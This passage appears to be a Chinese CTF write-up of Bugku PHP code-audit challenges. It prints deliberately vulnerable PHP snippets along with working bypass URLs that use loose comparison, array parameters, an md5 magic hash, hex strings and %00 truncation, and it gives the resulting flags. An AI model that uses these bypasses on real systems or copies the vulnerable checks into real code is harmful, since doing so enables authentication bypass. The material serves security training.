http://120.24.86.145:9009/22.php

$temp = $_GET['password'];
is_numeric($temp)?die("no numeric"):NULL;
if($temp>1336){
echo $flag;
```

`http://120.24.86.145:9009/22.php?password=1337x` 

`flag{bugku_null_numeric}` 

#### sha()函数比较绕过

```php
http://120.24.86.145:9009/7.php

<?php
$flag = "flag";
if (isset($_GET['name']) and isset($_GET['password']))
{
var_dump($_GET['name']);
echo "
";
var_dump($_GET['password']);
var_dump(sha1($_GET['name']));
var_dump(sha1($_GET['password']));
if ($_GET['name'] == $_GET['password'])
echo '

Your password can not be your name!

';
else if (sha1($_GET['name']) === sha1($_GET['password']))
die('Flag: '.$flag);
else
echo '
Invalid password.

';
}
else
echo '
Login first!

';
?>
```

`http://120.24.86.145:9009/7.php?name[]&password[]=1` 

` flag{bugku--daimasj-a2}` 

#### md5加密相等绕过

```php
http://120.24.86.145:9009/13.php

<?php
$md51 = md5('QNKCDZO');
$a = @$_GET['a'];
$md52 = @md5($a);
if(isset($a)){
if ($a != 'QNKCDZO' && $md51 == $md52) {
echo "flag{*}";
} else {
echo "false!!!";
}}
else{echo "please input a";}
?>
```

`http://120.24.86.145:9009/13.php?a=240610708`

`flag{bugku-dmsj-am9ls}`

#### 十六进制与数字比较

```php
http://120.24.86.145:9009/20.php

<?php
error_reporting(0);
function noother_says_correct($temp)
{
$flag = 'flag{test}';
$one = ord('1'); //ord — 返回字符的 ASCII 码值
$nine = ord('9'); //ord — 返回字符的 ASCII 码值
$number = '3735929054';
// Check all the input characters!
for ($i = 0; $i < strlen($number); $i++)
{
// Disallow all the digits!
$digit = ord($temp{$i});
if ( ($digit >= $one) && ($digit <= $nine) )
{
// Aha, digit not allowed!
return "flase";
}
}
if($number == $temp)
return $flag;
}
$temp = $_GET['password'];
echo noother_says_correct($temp);
?>
```

`http://120.24.86.145:9009/20.php?password=0xdeadc0de`

`flag{Bugku-admin-ctfdaimash}`

#### ereg正则%00截断

```php
http://120.24.86.145:9009/5.php
<?php
$flag = "xxx";
if (isset ($_GET['password']))
{
if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
{
echo 'You password must be alphanumeric';
}
else if (strlen($_GET['password']) < 8 && $_GET['password'] > 9999999)
{
if (strpos ($_GET['password'], '*-*') !== FALSE) //strpos — 查找字符串首次出现的位置
{
die('Flag: ' . $flag);
}
else
{
echo('- have not been found');
}
}else{
echo 'Invalid password';
}
}
?>
```

```php
http://120.24.86.145:9009/5.php?password=9e9%00*-*
```

`flag{bugku-dm-sj-a12JH8}`

#### strpos数组绕过

```php
http://120.24.86.145:9009/15.php

<?php
$flag = "flag";
if (isset ($_GET['ctf'])) {
if (@ereg ("^[1-9]+$", $_GET['ctf']) === FALSE)
echo '必须输入数字才行';
else if (strpos ($_GET['ctf'], '#biubiubiu') !== FALSE)
die('Flag: '.$flag);
else
echo '骚年，继续努力吧啊~';
}
?>
```

`http://120.24.86.145:9009/15.php?ctf=1%00%23biubiubiu` 

或

`http://120.24.86.145:9009/15.php?ctf[]`

`flag{Bugku-D-M-S-J572}` 

#### 数字验证正则绕过

```php
http://120.24.86.145:9009/21.php

<?php
error_reporting(0);
$flag = 'flag{test}';
if ("POST" == $_SERVER['REQUEST_METHOD'])
{
$password = $_POST['password'];
if (0 >= preg_match('/^[[:graph:]]{12,}$/', $password)) //preg_match — 执行一个正则表达式匹配
{
echo 'flag';
exit;
}
while (TRUE)
{
$reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/';
if (6 > preg_match_all($reg, $password, $arr))
break;
$c = 0;
$ps = array('punct', 'digit', 'upper', 'lower'); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母
foreach ($ps as $pt)
{
if (preg_match("/[[:$pt:]]+/", $password))
$c += 1;
}
if ($c < 3) break;
//>=3，必须包含四种类型三种与三种以上
if ("42" == $password) echo $flag;
else echo 'Wrong password';
exit;
}
}
?>
```

`flag{Bugku_preg_match}`

